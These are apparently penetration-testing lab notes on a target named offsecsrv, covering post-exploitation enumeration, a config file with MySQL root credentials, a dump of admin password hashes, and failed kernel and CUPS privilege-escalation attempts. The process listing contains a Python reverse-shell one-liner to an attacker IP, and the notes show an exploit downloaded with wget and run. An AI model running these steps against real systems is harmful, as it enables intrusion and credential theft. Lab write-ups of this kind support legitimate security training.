\e[97m[\e[94mi\e[97m] \e[90msof500\e[97m Sudo version\e[90m.................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof510\e[97m MySQL version\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof520\e[97m Postgres version\e[90m................................................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof530\e[97m Apache version\e[90m.................................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof540\e[97m Tmux version\e[90m.................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof550\e[97m Screen version\e[90m.................................................. \e[90mskip
\e[35m=============================================================(\e[32m containers \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn000\e[97m Are we in a docker container?\e[90m................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn010\e[97m Is docker available?\e[90m............................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mctn020\e[97m Is the user a member of the 'docker' group?\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn200\e[97m Are we in a lxc container?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mctn210\e[97m Is the user a member of any lxc/lxd group?\e[90m...................... \e[90mnope\e[0;0m
\e[35m==============================================================(\e[32m processes \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro000\e[97m Waiting for the process monitor to finish\e[90m.......................\e[34m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro001\e[97m Retrieving process binaries\e[90m.....................................\e[34m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro002\e[97m Retrieving process users\e[90m........................................\e[34m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mpro010\e[97m Can we write in any process binary?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mpro020\e[97m Processes running with root permissions\e[90m.........................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mpro030\e[97m Processes running by non-root users with shell\e[90m..................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro500\e[97m Running processes\e[90m............................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mpro510\e[97m Running process binaries and permissions\e[90m........................ \e[90mskip

\e[35m==================================(\e[32m FINISHED \e[35m)==================================\e[0;0m
www-data@offsecsrv:/tmp$ 

```

## Files Enum

```
cd www
www-data@offsecsrv:/var/www$ ls
ls
index.html  test
www-data@offsecsrv:/var/www$ cd test
cd test
www-data@offsecsrv:/var/www/test$ ls
ls
albums  cache_html  doc_files    index.php  robots.txt  uploaded  zp-data
cache   dev-tools   favicon.ico  plugins    themes      zp-core
www-data@offsecsrv:/var/www/test$ 
www-data@offsecsrv:/var/www/test$ cd zp-data
cd zp-data
www-data@offsecsrv:/var/www/test/zp-data$ ls
ls
security_log.txt  setup_log.txt  t??st.jpg  zp-config.php
www-data@offsecsrv:/var/www/test/zp-data$ cat zp-config.php
cat zp-config.php
<?php /* PUT NOTHING BEFORE THIS LINE, not even a line break! */
global $_zp_conf_vars;
$conf = array();

/** Do not edit above this line. **/
/**********************************/

/*//////////   zenPHOTO Configuration Variables   ///////////////////////////////
Note: zp-config.php.source is the source file for zp-config.php

For most installations Setup.php will copy zp-config.php.source to zp-config.php and 
make the necessary changes to it. Unless this fails you most likely have no need even 
to read this file.

If for some reason setup.php is not able to edit the zp-config.php file and you cannot
fix the file/folder permissions so that it can then you may have copy the 
zp-config.php.source file to zp-config.php and make changes here manually.

Advanced installations may wish to modify the album folder definitions below. 

Also on some servers zenphoto has problems correctly determining the WEB path and
SERVER path. For these cases you will need to implement the path overrides below.
///////////////////////////////////////////////////////////////////////////////*/

////////////////////////////////////////////////////////////////////////////////
// Database Information 
////////////////////////////////////////////////////////////////////////////////
$conf['db_software'] = 'MySQL';                 // someday we may support other databases
/** for historical reasons these fields reference mysql even though the database **
 ** might be a different software                                                **/
$conf['mysql_user'] = 'root';           // Supply your Database user id.
$conf['mysql_pass'] = 'hola';           // Supply your Database password.
$conf['mysql_host'] = 'localhost';  // Supply the name of your Database server.
$conf['mysql_database'] = 'zenphoto';       // Supply the name of Zenphoto's database 
// If you're sharing the database with other tables, use a prefix to be safe.
$conf['mysql_prefix'] = "zp_";

// If you are having problems with displaying some characters you may have to change
// the following:
$conf['UTF-8'] = true;

////////////////////////////////////////////////////////////////////////////////
// zp-config.php required options
////////////////////////////////////////////////////////////////////////////////

// location of album folder. 
// 'album_folder' is the name of the folder for the zenphoto albums.
// 'album_folder_class' determines how to interpret 'album_folder':
//    'std'         --  the folder must be a simple name. It resides in the root 
//                      of the zenphoto installation.
//    'in_webpath'  --  the folder must be the full path of the album folder from 
//                      the WEB root of the zenphoto installation. The WEB root of
//                                                                                      your installation is the folder where your browser looks
//                                                                                      if the link is just your domain (no folders).
//    'external'    --  the folder must be a full server path to the album folder.
//                      Images within an external folder are not visible to web
//                      browsers, so certain features such as flash players cannot
//                      display them
$conf['album_folder'] = '/albums/';
$conf['album_folder_class'] = 'std';

// Server Protocol
// Change this to "https" if you use an HTTPS server (a "https://..." url)
// Otherwise you should leave it at "http"
// NOTE: If you change this on an already installed configuration you will also have
// to change the gallery configuration server protocal option.
$conf['server_protocol'] = "http";
//
//
$conf['FILESYSTEM_CHARSET'] = 'UTF-8';
////////////////////////////////////////////////////////////////////////////////
// Path Overrides
////////////////////////////////////////////////////////////////////////////////
// Uncomment the following two lines ONLY IF YOU'RE HAVING PROBLEMS,
// like "file not found" or "not readable" errors.
// These allow you to override Zenphoto's detection of the correct paths
// on your server, which might work better on some setups.
////////////////////////////////////////////////////////////////////////////////

// define('WEBPATH', '/zenphoto');
// define('SERVERPATH', '/full/server/path/to/zenphoto');

////////////////////////////////////////////////////////////////////////////////
if (!defined('CHMOD_VALUE')) { define('CHMOD_VALUE',0755); }
/** Do not edit below this line. **/
/**********************************/
$_zp_conf_vars = $conf;
unset($conf);

?>
www-data@offsecsrv:/var/www/test/zp-data$ 

```

## Processes
```
www-data@offsecsrv:/var/www/test$ ps aux | cat
ps aux | cat
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   2792  1668 ?        Ss   09:01   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    09:01   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    09:01   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S    09:01   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    09:01   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S    09:01   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S    09:01   0:00 [cpuset]
root         8  0.0  0.0      0     0 ?        S    09:01   0:00 [khelper]
root         9  0.0  0.0      0     0 ?        S    09:01   0:00 [netns]
root        10  0.0  0.0      0     0 ?        S    09:01   0:00 [async/mgr]
root        11  0.0  0.0      0     0 ?        S    09:01   0:00 [pm]
root        12  0.0  0.0      0     0 ?        S    09:01   0:00 [sync_supers]
root        13  0.0  0.0      0     0 ?        S    09:01   0:00 [bdi-default]
root        14  0.0  0.0      0     0 ?        S    09:01   0:00 [kintegrityd/0]
root        15  0.0  0.0      0     0 ?        S    09:01   0:00 [kblockd/0]
root        16  0.0  0.0      0     0 ?        S    09:01   0:00 [kacpid]
root        17  0.0  0.0      0     0 ?        S    09:01   0:00 [kacpi_notify]
root        18  0.0  0.0      0     0 ?        S    09:01   0:00 [kacpi_hotplug]
root        19  0.0  0.0      0     0 ?        S    09:01   0:00 [ata/0]
root        20  0.0  0.0      0     0 ?        S    09:01   0:00 [ata_aux]
root        21  0.0  0.0      0     0 ?        S    09:01   0:00 [ksuspend_usbd]
root        22  0.0  0.0      0     0 ?        S    09:01   0:00 [khubd]
root        23  0.0  0.0      0     0 ?        S    09:01   0:00 [kseriod]
root        24  0.0  0.0      0     0 ?        S    09:01   0:00 [kmmcd]
root        27  0.0  0.0      0     0 ?        S    09:01   0:00 [khungtaskd]
root        28  0.0  0.0      0     0 ?        S    09:01   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        SN   09:01   0:00 [ksmd]
root        30  0.0  0.0      0     0 ?        S    09:01   0:00 [aio/0]
root        31  0.0  0.0      0     0 ?        S    09:01   0:00 [ecryptfs-kthrea]
root        32  0.0  0.0      0     0 ?        S    09:01   0:00 [crypto/0]
root        35  0.0  0.0      0     0 ?        S    09:01   0:00 [pciehpd]
root        37  0.0  0.0      0     0 ?        S    09:01   0:00 [scsi_eh_0]
root        38  0.0  0.0      0     0 ?        S    09:01   0:00 [scsi_eh_1]
root        40  0.0  0.0      0     0 ?        S    09:01   0:00 [kstriped]
root        42  0.0  0.0      0     0 ?        S    09:01   0:00 [kmpathd/0]
root        43  0.0  0.0      0     0 ?        S    09:01   0:00 [kmpath_handlerd]
root        44  0.0  0.0      0     0 ?        S    09:01   0:00 [ksnapd]
root        45  0.0  0.0      0     0 ?        S    09:01   0:00 [kondemand/0]
root        46  0.0  0.0      0     0 ?        S    09:01   0:00 [kconservative/0]
root       141  0.0  0.0      0     0 ?        S    09:01   0:00 [mpt_poll_0]
root       149  0.0  0.0      0     0 ?        S    09:01   0:00 [mpt/0]
root       230  0.0  0.0      0     0 ?        S    09:01   0:00 [scsi_eh_2]
root       247  0.0  0.0      0     0 ?        S    09:01   0:00 [jbd2/sda1-8]
root       248  0.0  0.0      0     0 ?        S    09:01   0:00 [ext4-dio-unwrit]
root       291  0.0  0.1   2312  1028 ?        S    09:01   0:00 upstart-udev-bridge --daemon
root       294  0.0  0.1   2788  1288 ?        S<s  09:01   0:00 udevd --daemon
root       511  0.0  0.0      0     0 ?        S    09:01   0:00 [kpsmoused]
root       599  0.0  0.1   2784  1236 ?        S<   09:01   0:00 udevd --daemon
root       600  0.0  0.1   2784  1236 ?        S<   09:01   0:00 udevd --daemon
syslog     642  0.0  0.1  33508  1484 ?        Sl   09:01   0:00 rsyslogd -c4
102        643  0.0  0.0   2776   972 ?        Ss   09:01   0:00 dbus-daemon --system --fork
root       688  0.0  0.4   9504  4464 ?        Ss   09:01   0:00 NetworkManager
root       700  0.0  0.2   4168  2304 ?        S    09:01   0:00 /usr/sbin/modem-manager
avahi      703  0.0  0.1   3020  1596 ?        S    09:01   0:00 avahi-daemon: running [offsecsrv.local]
avahi      707  0.0  0.0   2924   548 ?        Ss   09:01   0:00 avahi-daemon: chroot helper
root       757  0.0  0.0   1788   560 tty4     Ss+  09:01   0:00 /sbin/getty -8 38400 tty4
root       765  0.0  0.0   1788   564 tty5     Ss+  09:01   0:00 /sbin/getty -8 38400 tty5
root       772  0.0  0.0   1788   556 tty2     Ss+  09:01   0:00 /sbin/getty -8 38400 tty2
root       773  0.0  0.0   1788   560 tty3     Ss+  09:01   0:00 /sbin/getty -8 38400 tty3
root       776  0.0  0.0   1788   556 tty6     Ss+  09:01   0:00 /sbin/getty -8 38400 tty6
root       777  0.0  0.0   2044   864 ?        Ss   09:01   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root       792  0.0  0.0   2372   892 ?        Ss   09:01   0:00 cron
daemon     793  0.0  0.0   2244   432 ?        Ss   09:01   0:00 atd
mysql      812  0.0  2.1 178828 22472 ?        Ssl  09:01   0:00 /usr/sbin/mysqld
root       867  0.0  0.2   6768  2984 ?        Ss   09:01   0:00 /usr/sbin/cupsd -C /etc/cups/cupsd.conf
root       905  0.0  0.1   4832  1728 ?        S    09:01   0:00 /sbin/wpa_supplicant -u -s
root       987  0.0  0.9  41840  9972 ?        Ss   09:01   0:00 /usr/sbin/apache2 -k start
root      1063  0.0  0.0      0     0 ?        S    09:01   0:00 [vmmemctl]
root      1188  0.0  0.0   1788   560 tty1     Ss+  09:01   0:00 /sbin/getty -8 38400 tty1
root      1366  0.0  0.4  36960  4356 ?        Sl   09:01   0:01 /usr/sbin/vmtoolsd
root      1418  0.0  0.0      0     0 ?        S    09:01   0:00 [flush-8:0]
root      1663  0.0  0.2   5548  2124 ?        Ss   09:04   0:00 /usr/sbin/sshd -D
www-data  2080  0.0  0.5  42192  5820 ?        S    09:30   0:00 /usr/sbin/apache2 -k start
www-data  2104  0.0  0.0   1828   532 ?        S    09:36   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.162",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data  2105  0.0  0.4   7740  4268 ?        S    09:36   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.162",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data  2106  0.0  0.1   3028  1644 pts/0    Ss   09:36   0:00 /bin/bash
www-data  2225  0.0  0.5  41976  5348 ?        S    09:36   0:00 /usr/sbin/apache2 -k start
www-data 19799  0.0  0.5  41976  5348 ?        S    09:41   0:00 /usr/sbin/apache2 -k start
www-data 19800  0.0  0.5  41976  5348 ?        S    09:41   0:00 /usr/sbin/apache2 -k start
www-data 19806  0.0  0.5  41976  5348 ?        S    09:45   0:00 /usr/sbin/apache2 -k start
www-data 19821  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19829  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19834  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19842  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19845  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19847  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19848  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19854  0.0  0.5  41976  5348 ?        S    09:49   0:00 /usr/sbin/apache2 -k start
www-data 19855  0.0  0.5  41976  5348 ?        S    09:49   0:00 /usr/sbin/apache2 -k start
www-data 19857  0.0  0.5  41976  5348 ?        S    09:50   0:00 /usr/sbin/apache2 -k start
www-data 19865  0.0  0.5  41976  5344 ?        S    09:52   0:00 /usr/sbin/apache2 -k start
www-data 19866  0.0  0.5  41976  5340 ?        S    09:52   0:00 /usr/sbin/apache2 -k start
www-data 19867  0.0  0.5  41976  5340 ?        S    09:52   0:00 /usr/sbin/apache2 -k start
www-data 19868  0.0  0.5  41976  5340 ?        S    09:53   0:00 /usr/sbin/apache2 -k start
www-data 19873  0.0  0.5  41976  5332 ?        S    09:53   0:00 /usr/sbin/apache2 -k start
www-data 19874  0.0  0.4  41840  4904 ?        S    09:53   0:00 /usr/sbin/apache2 -k start
www-data 19876  0.0  0.4  41840  4736 ?        S    09:53   0:00 /usr/sbin/apache2 -k start
www-data 19877  0.0  0.0   2432   972 pts/0    R+   09:53   0:00 ps aux
www-data 19878  0.0  0.0   1788   420 pts/0    S+   09:53   0:00 cat
www-data@offsecsrv:/var/www/test$
```

```
www-data@offsecsrv:/var/www/test$ netstat -ano | grep LISTEN
netstat -ano | grep LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      keepalive (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
unix  2      [ ACC ]     STREAM     LISTENING     3583     /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     3852     /var/run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     2387     @/com/ubuntu/upstart
unix  2      [ ACC ]     STREAM     LISTENING     3948     /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     11118    /var/run/cups/cups.sock
unix  2      [ ACC ]     STREAM     LISTENING     3753     /var/run/avahi-daemon/socket
www-data@offsecsrv:/var/www/test$ 

```

```
www-data@offsecsrv:/var/www/test$ mysql -u root
mysql -u root
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
www-data@offsecsrv:/var/www/test$ 
www-data@offsecsrv:/var/www/test/zp-data$ mysql -uroot -phola
mysql -uroot -phola
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 299
Server version: 5.1.41-3ubuntu12.10 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databses;
show databses;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'databses' at line 1
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| zenphoto           |
+--------------------+
3 rows in set (0.00 sec)

mysql> use zenphoto
use zenphoto
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+--------------------+
| Tables_in_zenphoto |
+--------------------+
| zp_admin_to_object |
| zp_administrators  |
| zp_albums          |
| zp_captcha         |
| zp_comments        |
| zp_images          |
| zp_menu            |
| zp_news            |
| zp_news2cat        |
| zp_news_categories |
| zp_obj_to_tag      |
| zp_options         |
| zp_pages           |
| zp_plugin_storage  |
| zp_tags            |
+--------------------+
15 rows in set (0.00 sec)

mysql> select * from zp_administrators
select * from zp_administrators
    -> ;
;
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
| id | user           | pass                                     | name     | email | rights     | custom_data                                 | valid | group | date                | loggedin | quota | language | prime_album | other_credentials |
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
|  1 | administrators | NULL                                     | group    | NULL  | 1961343989 | Users with full privileges                  |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  2 | viewers        | NULL                                     | group    | NULL  |       2945 | Users allowed only to view zenphoto objects |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  3 | bozos          | NULL                                     | group    | NULL  |          0 | Banned users                                |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  4 | album managers | NULL                                     | template | NULL  |   67386245 | Managers of one or more albums              |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  5 | default        | NULL                                     | template | NULL  |        945 | Default user settings                       |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  6 | newuser        | NULL                                     | template | NULL  |          1 | Newly registered and verified users         |     0 | NULL  | 2011-11-09 06:54:47 | NULL     |  NULL | NULL     | NULL        | NULL              |
|  7 | admin          | 63e5c2e178e611b692b526f8b6332317f2ff5513 | admin    | admin | 1961343989 | NULL                                        |     1 | NULL  | 2011-11-09 06:56:29 | NULL     |  NULL | NULL     | NULL        | NULL              |
+----+----------------+------------------------------------------+----------+-------+------------+---------------------------------------------+-------+-------+---------------------+----------+-------+----------+-------------+-------------------+
7 rows in set (0.00 sec)

mysql> 

```

## Kernel Exploit Test
```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 14814                               
  Exploit: Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/14814
     Path: /usr/share/exploitdb/exploits/linux/local/14814.c
File Type: C source, ASCII text

Copied to: /tmp/14814.c


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.162.41 - - [29/Jan/2022 05:14:51] "GET /14814.c HTTP/1.0" 200 -
```

```
www-data@offsecsrv:/etc/ssh$ uname -a
uname -a
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
www-data@offsecsrv:/etc/ssh$ gcc
gcc
gcc: no input files
www-data@offsecsrv:/etc/ssh$ cd /tmp
cd /tmp
www-data@offsecsrv:/tmp$ wget 192.168.49.162/14814.c
wget 192.168.49.162/14814.c
--2022-01-29 10:14:53--  http://192.168.49.162/14814.c
Connecting to 192.168.49.162:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14963 (15K) [text/x-csrc]
Saving to: `14814.c'

100%[======================================>] 14,963      84.3K/s   in 0.2s    

2022-01-29 10:14:54 (84.3 KB/s) - `14814.c' saved [14963/14963]

www-data@offsecsrv:/tmp$ gcc 14814.c -o exploit
gcc 14814.c -o exploit
www-data@offsecsrv:/tmp$ ./exploit
./exploit
[+] looking for symbols...
[-] symbol table not availabe, aborting!
[-] symbol table not availabe, aborting!
[+] setting up exploit payload...
[+] creating PF_CAN socket...
[+] connecting PF_CAN socket...
[+] clearing out any active OPs via RX_DELETE...
[+] removing any active user-owned shmids...
[+] massaging kmalloc-96 SLUB cache with dummy allocations
[+] corrupting BCM OP with truncated allocation via RX_SETUP...
[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...
[+] mmap'ed mapping of length 328 at 0xb7732000
[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...
[+] seeking out the smashed shmid_kernel...
[+] discovered our smashed shmid_kernel at shmid[248] = 8126712
[+] re-smashing the shmid_kernel with exploit payload...

```

Doesn't work

## Cups test

CUPS is running as root

```
www-data@offsecsrv:/tmp$ apt-cache policy cups
apt-cache policy cups
cups:
  Installed: 1.4.3-1ubuntu1.3
  Candidate: 1.4.3-1ubuntu1.5
  Version table:
     1.4.3-1ubuntu1.5 0
        500 http://us.archive.ubuntu.com/ubuntu/ lucid-updates/main Packages
        500 http://security.ubuntu.com/ubuntu/ lucid-security/main Packages
 *** 1.4.3-1ubuntu1.3 0
        100 /var/lib/dpkg/status
     1.4.3-1 0
        500 http://us.archive.ubuntu.com/ubuntu/ lucid/main Packages
www-data@offsecsrv:/tmp$ 

```

```
┌──(kali㉿kali)-[/tmp]
└─$ python 41233.py -a 192.168.162.41 -b 23 -f

             lol ty google
             0000000000000
          0000000000000000000   00
       00000000000000000000000000000
      0000000000000000000000000000000
    000000000             0000000000
   00000000               0000000000
  0000000                000000000000
 0000000               000000000000000
 000000              000000000  000000
0000000            000000000     000000
000000            000000000      000000
000000          000000000        000000
000000         00000000          000000
000000       000000000           000000
0000000    000000000            0000000
 000000   000000000             000000
 0000000000000000              0000000
  0000000000000               0000000
   00000000000              00000000
   00000000000            000000000
  0000000000000000000000000000000
   00000000000000000000000000000
     000  0000000000000000000
             0000000000000
              @0x00string
https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py

[*]     locate available printer
[-]     no printers
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
www-data@offsecsrv:/tmp$ /usr/sbin/lpadmin -p testpr2 -E -v parallel:/dev/lp0 -m laserjet.ppd
<sr/sbin/lpadmin -p testpr2 -E -v parallel:/dev/lp0 -m laserjet.ppd          
lpadmin: Forbidden
www-data@offsecsrv:/tmp$ 

```

# Others